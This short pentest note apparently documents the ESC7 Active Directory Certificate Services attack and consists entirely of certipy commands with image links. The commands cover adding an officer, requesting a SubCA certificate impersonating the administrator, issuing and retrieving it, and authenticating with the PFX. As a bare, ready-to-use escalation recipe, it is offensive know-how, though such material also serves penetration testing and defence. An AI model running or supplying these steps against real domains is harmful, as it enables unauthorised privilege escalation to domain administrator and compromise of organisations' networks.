![[../../assets/ESC7/image 414.png|image 414.png]]
- certipy ca -ca <CA> -add-officer <user> -username <user>@<domain> -p <pass>
  
  
![[../../assets/ESC7/image 1 309.png|image 1 309.png]]
- certipy req -ca <CA> -target <target_machine> -template SubCA -upn administrator@<domain> -username <user>@<domain> -p <pass>
  
  
![[../../assets/ESC7/image 2 260.png|image 2 260.png]]
- certipy ca -ca <CA> -issue-request <issue_id> -username <user>@<domain> -p <pass>
  
  
![[../../assets/ESC7/image 3 222.png|image 3 222.png]]
- certipy req -ca <CA> -target <target_machine> -retrieve <issue_id> -username <user>@<domain> -p <pass>
  
  
![[../../assets/ESC7/image 4 193.png|image 4 193.png]]
- certipy auth -pfx administrator.pfx -dc-ip <IP>